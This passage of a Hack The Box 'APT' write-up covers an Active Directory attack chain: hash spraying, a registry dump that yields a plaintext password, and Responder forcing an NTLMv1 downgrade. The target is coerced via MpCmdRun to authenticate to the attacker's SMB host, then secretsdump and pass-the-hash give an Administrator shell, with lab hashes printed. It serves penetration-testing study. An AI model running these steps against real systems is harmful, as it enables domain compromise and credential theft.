+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="sh"><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>hashes.txt<span class="si">)</span><span class="p">;</span> <span class="k">do
+    </span><span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span>
+    <span class="nv">attempt</span><span class="o">=</span><span class="si">$(</span>impacket-getTGT HTB.local/henry.vinson@apt.htb <span class="nt">-hashes</span> <span class="nv">$i</span><span class="si">)</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="o">!</span> <span class="o">[[</span> <span class="nv">$attempt</span> <span class="o">==</span> <span class="k"><strong></span><span class="s2">"SessionError"</span><span class="k"></strong></span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"HASH FOUND: [</span><span class="nv">$i</span><span class="s2">]"</span><span class="p">;</span>
+        <span class="nb">echo</span> <span class="nv">$attempt</span><span class="p">;</span>
+        <span class="nb">break</span><span class="p">;</span>
+    <span class="k">fi</span><span class="p">;</span>
+<span class="k">done</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>A password spray (in this case, hashes extracted from ntds.dit were used) was attempted for the user, <span style="color:orange">henry.vinson</span>, and one of the hashes (not his own) was found to be able to forge a krbtgt ticket. However, this still does not seem to work for authentication via WinRM.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="3-3-dumping-hkey_users">3.3 Dumping HKEY_USERS</h3>
+<div class="paragraph">
+<p>The HKU registry hive contains all configurations set for all active users.</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>henry.vinson@apt.htb.ccache
+
+<span class="nv">$ </span><span class="nb">env</span> | <span class="nb">grep </span>KRB5
+
+  <span class="nv">KRB5CCNAME</span><span class="o">=</span>henry.vinson@apt.htb.ccache
+
+<span class="nv">$ </span>impacket-reg <span class="nt">-k</span> apt.htb.local query <span class="nt">-keyName</span> HKU <span class="nt">-s</span> <span class="o">&gt;</span> registry.txt</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>In this case, since there is already a cached ticket for henry.vinson, all contents from his user registry hive will be extracted.</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">cat </span>registry.txt | <span class="nb">grep</span> <span class="nt">-i</span> <span class="nt">-A5</span> <span class="nt">-B5</span> <span class="nt">-E</span> <span class="s1">'henry$'</span>
+
+  <span class="o">[</span>...omitted...]
+  <span class="se">\S</span>oftware<span class="se">\G</span>iganticHostingManagementSystem<span class="se">\</span>
+	        <span class="c"><mark>UserName	REG_SZ	 henry.vinson_adm</mark></span>
+	        <span class="c"><mark>PassWord	REG_SZ	 G1#Ny5@2dvht</mark></span>
+  <span class="o">[</span>...omitted...]</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>And within the extracted information are stored credentials for the deployed service, <code><strong>GiganticHostingManagementSystem</strong></code>.</p>
+</div>
+<hr>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-4-generating-a-user-shell-henry-vinson_adm">PART 4 : GENERATING A USER SHELL (henry.vinson_adm)</h2>
+<div class="sectionbody">
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> apt.htb <span class="nt">-u</span> henry.vinson_adm <span class="nt">-p</span> <span class="s1">'G1#Ny5@2dvht'</span> <span class="nt">--no-colors</span>
+
+PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+
+  </span>htb<span class="se">\h</span>enry.vinson_adm
+
+PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; ipconfig
+
+  Windows IP Configuration
+
+
+  Ethernet adapter Ethernet:
+
+     Connection-specific DNS Suffix  <span class="nb">.</span> :
+     IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::3d05:a1a8:4a51:c2fe
+     IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::b885:d62a:d679:573f
+     Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::3d05:a1a8:4a51:c2fe%5
+     IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.10.213
+     Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.255.0
+     Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::1
+                                         fe80::250:56ff:feb9:75a0%5
+                                         10.10.10.2
+
+PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; <span class="nb">dir</span> ..<span class="se">\D</span>esktop
+
+      Directory: C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>esktop
+
+
+  Mode                LastWriteTime         Length Name
+  <span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+  <span class="nt">-ar---</span>       xx/xx/xxxx  xx:xx XX             34 user.txt</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>It seems like the reason why the other users cannot authenticate via WinRM even though a valid hash has been found is that they are not part of the <span style="color:orange">Remote Management Users</span> group:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; net localgroup <span class="s2">"Remote Management Users"</span>
+
+  Alias name     Remote Management Users
+  Comment        Members of this group can access WMI resources over management protocols <span class="o">(</span>such as WS-Management via the Windows Remote Management service<span class="o">)</span><span class="nb">.</span> This applies only to WMI namespaces that grant access to the user.
+
+  Members
+
+  <span class="nt">-------------------------------------------------------------------------------</span>
+  henry.vinson_adm</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<hr>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-5-privilege-escalation-henry-vinson_adm-administrator">PART 5 : PRIVILEGE ESCALATION (henry.vinson_adm &#8594; Administrator)</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="5-1-the-console-history-of-henry-vinson_adm">5.1 The console history of henry.vinson_adm</h3>
+<div class="paragraph">
+<p>Checking the console history of the current user:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..<span class="se">\A</span>ppData
+
+PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\A</span>ppData&gt; <span class="nb">type </span>Roaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="ps1">$Cred = get-credential administrator
+invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force}</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The DWORD value for <code><strong>lmcompatibilitylevel</strong></code> was set to <code><strong>2</strong></code> and based on the Microsoft documentation for LAN Manager authentication level:</p>
+</div>
+<table class="tableblock frame-all grid-all stretch">
+<colgroup>
+<col style="width: 8.3333%;">
+<col style="width: 25%;">
+<col style="width: 66.6667%;">
+</colgroup>
+<thead>
+<tr>
+<th class="tableblock halign-left valign-top">DWORD</th>
+<th class="tableblock halign-left valign-top">Setting</th>
+<th class="tableblock halign-left valign-top">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">2</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Send NTLM response only</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Client devices use NTLMv1 authentication, and they use NTLMv2 session security if the server supports it. Domain controllers accept LM, NTLM, and NTLMv2 authentication.</p></td>
+</tr>
+</tbody>
+</table>
+<div class="paragraph">
+<p>With this the machine should only repond with NTLMv1 hashes during authentication.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="5-2-intercepting-ntlmv1-hashes">5.2 Intercepting NTLMv1 Hashes</h3>
+<div class="paragraph">
+<p>Setting up <code><strong>responder</strong></code> with a custom challeng, "1122334455667788"</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">cat</span> /etc/responder/Responder.conf | <span class="nb">grep</span> <span class="nt">-i</span> challenge
+
+  <span class="p">;</span> Custom challenge.
+  <span class="p">;</span> Use <span class="s2">"Random"</span> <span class="k">for </span>generating a random challenge <span class="k">for </span>each requests <span class="o">(</span>Default<span class="o">)</span>
+  Challenge <span class="o">=</span> 1122334455667788
+
+<span class="nv">$ </span><span class="nb">sudo </span>responder <span class="nt">-I</span> tun0 <span class="nt">--lm</span>
+
+                                           <em>
+    .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+    |   <em>|  <span class="nt">-</em></span>|<em> <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-</em></span>|   _|
+    |<em>| |</em><em></em>|</em><em><em>|   </em>|<em></em></em>|<em>|</em>|<em><em></em>||<em></em></em>|<em>|
+                     |</em>|
+
+             NBT-NS, LLMNR &amp; MDNS Responder 3.0.2.0
+
+    Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
+    To <span class="nb">kill </span>this script hit CTRL-C
+
+    <span class="o">[</span>...omitted...]
+    <span class="o">[</span>+] Servers:
+        <span class="o">[</span>...omitted...]
+        SMB server                 <span class="o">[</span>ON]
+    <span class="o">[</span>...omitted...]
+
+    <span class="o">[</span>+] Poisoning Options:
+        <span class="o">[</span>...omitted...]
+        Force LM downgrade         <span class="o">[</span>ON]
+    <span class="o">[</span>...omitted...]
+
+    <span class="o">[</span>+] Generic Options:
+        Responder NIC              <span class="o">[</span>tun0]
+        Responder IP               <span class="o">[</span>10.10.14.11]
+        Challenge <span class="nb">set</span>              <span class="o">[</span>1122334455667788]
+    <span class="o">[</span>...omitted...]</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Then forcing the target machine to force NTLM authentication:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\A</span>ppData&gt; <span class="nb">cd</span> <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows Defender</span><span class="se">\p</span><span class="s2">latform"</span>
+
+PS C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows Defender<span class="se">\p</span>latform&gt; <span class="nb">dir
+
+
+      </span>Directory: C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows Defender<span class="se">\p</span>latform
+
+
+  Mode                LastWriteTime         Length Name
+  <span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+  d-----       11/10/2020  11:09 AM                4.18.2010.7-0
+  d-----        3/17/2021   3:13 PM                4.18.2102.4-0
+
+PS C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows Defender<span class="se">\p</span>latform&gt; <span class="nb">cd </span>4.18.2010.7-0
+
+C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows Defender<span class="se">\p</span>latform<span class="se">\4</span>.18.2010.7-0&gt; .<span class="se">\M</span>pCmdRun.exe <span class="nt">-Scan</span> <span class="nt">-ScanType</span> 3 <span class="nt">-File</span> <span class="se">\\</span>10.10.14.11<span class="se">\f</span>ile.txt</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Looking back in the running <code><strong>responder</strong></code>, the NTLMv1 hash for the computer account was retrieved:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="console"><span class="go">[SMB] NTLMv1 Client   : 10.10.10.213
+</span><span class="gp">[SMB] NTLMv1 Username : HTB\APT$</span><span class="w">
+</span><span class="gp">[SMB] NTLMv1 Hash     : APT$</span>::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
+<span class="go">[...omitted...]</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="console"><span class="gp">PS C:\Users\henry.vinson_adm\Documents&gt;</span><span class="w"> </span>Get-ADComputer <span class="s2">"APT"</span>
+<span class="go">
+  DistinguishedName : CN=APT,OU=Domain Controllers,DC=htb,DC=local
+  DNSHostName       : apt.htb.local
+  Enabled           : True
+  Name              : APT
+  ObjectClass       : computer
+  ObjectGUID        : a78acf4d-42b5-49bc-9855-2389a80e726d
+</span><span class="gp">  SamAccountName    : APT$</span><span class="w">
+</span><span class="go">  SID               : S-1-5-21-2993095098-2100462451-206186470-1001
+  UserPrincipalName :</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Going to <a href="https://crack.sh/get-cracking/">crack.sh</a> and submitting the value, <span style="color:orange">NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384</span>, will return the following if the hash was successfully cracked:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="console"><span class="gp">Token: $</span>NETNTLM<span class="nv">$1122334455667788$95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384</span>
+<span class="go">Key: d167c3238864b12f5f82feae86a7f798</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+</div>
+<div class="sect2">
+<h3 id="5-3-running-impacket-secretsdump-to-obtain-password-hashes">5.3 Running impacket-secretsdump to obtain password hashes</h3>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>impacket-secretsdump <span class="nt">-hashes</span> aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798 <span class="s1">'HTB.local/APT$@apt.htb'</span>
+
+  Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+  <span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+  <span class="o">[</span><span class="k"><strong></span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
+  <span class="o">[</span><span class="k"></strong></span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+  <span class="c"><mark>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::</mark></span>
+  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
+  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+  henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
+  henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
+  APT<span class="nv">$:</span>1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
+  <span class="o">[</span><span class="k"><strong></span><span class="o">]</span> Kerberos keys grabbed
+  Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
+  Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
+  Administrator:des-cbc-md5:0816d9d052239b8a
+  krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
+  krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
+  krbtgt:des-cbc-md5:f8c26238c2d976bf
+  henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
+  henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
+  henry.vinson:des-cbc-md5:73b6f71cae264fad
+  henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
+  henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
+  henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
+  APT<span class="nv">$:</span>aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
+  APT<span class="nv">$:</span>aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
+  APT<span class="nv">$:</span>des-cbc-md5:76c45245f104a4bf
+  <span class="o">[</span><span class="k"></strong></span><span class="o">]</span> Cleaning up...</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+</div>
+<div class="sect2">
+<h3 id="5-4-shell-as-administrator">5.4 Shell as Administrator</h3>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> apt.htb <span class="nt">-u</span> Administrator <span class="nt">-H</span> c370bddf384a691d811ff3495e8a72e2 <span class="nt">--no-colors</span>
+
+PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+
+  </span>htb<span class="se">\a</span>dministrator
+
+PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">dir</span> ..<span class="se">\D</span>esktop
+
+
+      Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+
+
+  Mode                LastWriteTime         Length Name
+  <span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+  <span class="nt">-ar---</span>        4/10/2021   9:11 AM             34 root.txt
+
+
+PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ipconfig
+
+  Windows IP Configuration
+
+
+  Ethernet adapter Ethernet:
+
+     Connection-specific DNS Suffix  <span class="nb">.</span> :
+     IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::3d05:a1a8:4a51:c2fe
+     IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::b885:d62a:d679:573f
+     Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::3d05:a1a8:4a51:c2fe%5
+     IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.10.213
+     Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.255.0
+     Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::1
+                                         fe80::250:56ff:feb9:75a0%5
+                                         10.10.10.2</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<hr>
+<hr>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="references">REFERENCES</h2>
+<div class="sectionbody">
+<div class="ulist">
+<ul>
+<li>
+<p><a href="https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/" class="bare">https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/</a></p>
+</li>
+<li>
+<p><a href="https://adsecurity.org/?p=2398" class="bare">https://adsecurity.org/?p=2398</a></p>
+</li>
+<li>
+<p><a href="https://www.lifewire.com/hkey-users-2625903" class="bare">https://www.lifewire.com/hkey-users-2625903</a></p>
+</li>
+<li>
+<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level" class="bare">https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level</a></p>
+</li>
+</ul>
+</div>
+</div>
+</div></section>
+       </div>
+    </div>
+
+    <script>
+      function openNav() {
+        document.getElementById("sidebar").style.width = "250px";
+        document.getElementById("content").style.marginLeft = "250px";
+      }
+      function closeNav() {
+        document.getElementById("sidebar").removeAttribute("style");
+        document.getElementById("content").removeAttribute("style");
+      } 
+    </script>
+
+    
+      <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'true', 'auto');
+        ga('send', 'pageview');
+      </script>
+    
+  </body>
+</html>
